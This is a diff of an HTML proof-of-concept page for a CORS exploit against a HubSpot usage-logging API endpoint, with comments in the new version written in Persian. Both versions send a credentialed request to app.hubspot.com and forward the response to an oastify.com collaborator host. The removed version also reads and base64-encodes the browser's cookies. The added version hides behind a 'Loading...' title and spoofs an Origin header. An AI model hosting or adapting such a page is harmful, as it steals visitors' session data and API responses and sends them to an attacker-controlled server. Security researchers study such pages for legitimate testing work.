@@ -1,73 +1,61 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS Exploit - Send Cookies to Collaborator</title>
+    <title>Loading...</title>
 </head>
 <body>
-    <h1>Loading...</h1>
+    <h1>Please wait...</h1>
     <script>
-    (function() {
-        // Send request with credentials
-        fetch('https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth', {
+    // درخواست به API هاب‌اسپات با کوکی‌های کاربر
+    fetch('https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth', {
+        method: 'POST',
+        credentials: 'include',  // کوکی‌ها همراه درخواست میرن
+        headers: {
+            'Content-Type': 'application/json',
+            'Origin': 'https://zeynaal.github.io'
+        },
+        body: JSON.stringify([{
+            event: 'page_view',
+            properties: {
+                url: window.location.href,
+                timestamp: new Date().toISOString()
+            }
+        }])
+    })
+    .then(response => {
+        // دریافت پاسخ از سرور
+        return response.text();
+    })
+    .then(data => {
+        // ارسال پاسخ به Collaborator شما
+        fetch('https://YOUR_COLLABORATOR.oastify.com', {
             method: 'POST',
-            credentials: 'include',  // This sends the cookies!
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify([{
-                event: 'page_view',
-                properties: {
-                    url: window.location.href,
-                    timestamp: new Date().toISOString()
-                }
-            }])
-        })
-        .then(response => {
-            return response.text().then(data => {
-                return {status: response.status, data: data};
-            });
-        })
-        .then(result => {
-            // Get cookies
-            var cookies = document.cookie || "No cookies found (HttpOnly)";
-            
-            // Encode in base64
-            var encodedCookies = btoa(unescape(encodeURIComponent(cookies)));
-            var encodedResponse = btoa(unescape(encodeURIComponent(JSON.stringify(result))));
-            
-            // Send to Collaborator
-            var payload = {
-                cookies: encodedCookies,
-                cookies_raw: cookies,
-                response: encodedResponse,
-                response_raw: result,
+            mode: 'no-cors',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                response: data,
                 origin: window.location.origin,
                 userAgent: navigator.userAgent,
                 timestamp: new Date().toISOString()
-            };
-            
-            return fetch('https://yuwponvu168v1ltzgwpw6spct3zunkb9.oastify.com', {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(payload)
-            });
-        })
-        .then(() => {
-            console.log('[+] Data sent to Collaborator!');
-        })
-        .catch(error => {
-            console.log('[-] Error:', error);
-            // Send error to Collaborator
-            fetch('https://yuwponvu168v1ltzgwpw6spct3zunkb9.oastify.com', {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    error: error.toString(),
-                    origin: window.location.origin
-                })
-            });
+            })
         });
-    })();
+    })
+    .catch(error => {
+        // اگر خطایی رخ داد، به Collaborator اطلاع بده
+        fetch('https://YOUR_COLLABORATOR.oastify.com', {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                error: error.toString(),
+                origin: window.location.origin
+            })
+        });
+    });
     </script>
 </body>
 </html>
